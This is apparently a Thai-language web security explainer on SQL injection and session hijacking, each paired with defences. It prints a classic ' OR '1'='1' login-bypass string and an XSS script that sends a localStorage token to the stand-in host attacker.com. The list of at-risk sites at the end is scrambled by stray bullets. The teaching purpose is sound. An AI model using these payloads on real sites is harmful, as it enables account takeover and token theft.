 SQL Injection คืออะไร?

                        
SQL Injection เป็นเทคนิคการโจมตีที่ผู้โจมตีใส่ SQL code ลงในช่องกรอกข้อมูล (เช่น Login form) เพื่อเปลี่ยนแปลง SQL Query ที่ server ส่งไปยัง database

                        

                            
ตัวอย่าง:

                            
-- Query ปกติ
SELECT * FROM users 
WHERE username = 'admin' AND password = 'pass'

-- Query ที่ถูก Inject
SELECT * FROM users 
WHERE username = '' OR '1'='1' -- ' AND password = 'x'
-- เงื่อนไข '1'='1' เป็นจริงเสมอ → คืน user ทุกคน!

                        

                        

                            
 วิธีป้องกัน:

                            
    
                                
  • ใช้ Parameterized Query / Prepared Statements
    • 
                                
  • ใช้ ORM (Object-Relational Mapping)
    • 
                                
  • ทำ Input Validation
    • 
                                
  • ใช้ Least Privilege สำหรับ DB user
    • 
                            

                        

                    


                    

                        
 Session Hijacking คืออะไร?

                        
Session Hijacking เป็นการขโมย Session ID หรือ Token ของผู้ใช้ที่ login แล้ว เพื่อปลอมตัวเป็นผู้ใช้คนนั้น โดยไม่ต้องรู้รหัสผ่าน

                        

                            
วิธีการโจมตี:

                            
// 1. XSS Attack - ขโมย Token จาก localStorage
<script>
  fetch('https://attacker.com/steal?token=' 
    + localStorage.getItem('token'))
</script>

// 2. Man-in-the-Middle (HTTP ไม่เข้ารหัส)
// 3. Session Fixation
// 4. Packet Sniffing (WiFi สาธารณะ)

                        

                        

                            
 วิธีป้องกัน:

                            
    
                                
  • ใช้ httpOnly Cookie แทน localStorage
    • 
                                
  • บังคับ HTTPS ทุก connection
    • 
                                
  • ใช้ SameSite Cookie
    • 
                                
  • ทำ Token Rotation
    • 
                                
  • ตั้ง Token Expiry ที่สั้น
    • 
                            

                        

                    

                


                
                

                    
 ใช้ได้กับเว็บไซต์แบบไหนบ้าง?

                    
การโจมตีแต่ละแบบจะมีผลกับเว็บไซต์ที่มีลักษณะเฉพาะ ขึ้นอยู่กับวิธีการเขียนโค้ดและการตั้งค่าความปลอดภัย

Session Hijacking

                            

                            

                                

                                    
 เว็บที่เสี่ยง

                                    
    
                                        
  • 
                                            
                                            
    เก็บ Token ใน localStorageดึงได้ง่ายผ่าน XSS attack

  •

    • 
                                        
  •

    • 
                                        
  • 
                                            
                                            
    มีช่องโหว่ XSSผู้โจมตีฝัง script ขโมย token ได้
    
                                        
    • 
                                        
  • 
                                            
                                            
    ใช้ HTTP แทน HTTPSดักจับ traffic ด้วย packet sniffing
    
                                        
    •

    • 
                                        
  •

    • 
                                        
  • 
                                            
                                            
    ตรวจสอบ IP / Device Fingerprintระบุอุปกรณ์ร่วมด้วย
    
                                        
    • 
                                        
  •
